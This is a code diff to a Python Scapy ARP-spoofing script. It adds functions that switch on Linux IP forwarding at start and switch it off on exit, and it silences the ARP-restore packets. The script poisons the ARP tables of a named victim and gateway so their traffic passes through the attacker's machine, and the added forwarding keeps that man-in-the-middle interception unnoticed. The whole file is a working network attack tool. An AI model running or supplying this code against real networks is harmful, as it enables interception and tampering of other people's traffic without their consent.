@@ -9,6 +9,7 @@
 from scapy.all import *
 from scapy.layers.l2 import Ether, ARP
 import sys
+import os
 
 def getMAC(ip):
     ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3, verbose=False)
@@ -24,10 +25,17 @@ def ARPspoof(srcIP, targetIP, targetMAC):
 def restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC):
     arp1=ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gatewayMAC)
     arp2=ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victimMAC)
-    send(arp1, count=3)
-    send(arp2, count=3)
+    send(arp1, count=3, verbose=False)
+    send(arp2, count=3, verbose=False)
+
+def enable_ip_forwarding():
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+
+def disable_ip_forwarding():
+    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
 
 def main(gatewayIP, victimIP):
+    enable_ip_forwarding()
     victimMAC = getMAC(victimIP)
     gatewayMAC = getMAC(gatewayIP)
 
@@ -52,6 +60,7 @@ def main(gatewayIP, victimIP):
             __import__('time').sleep(3)
     except KeyboardInterrupt:
         restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC)
+        disable_ip_forwarding()
         print("terminated Spoofing -> RESTORED ARP TABLE")
 
 if __name__ == '__main__':
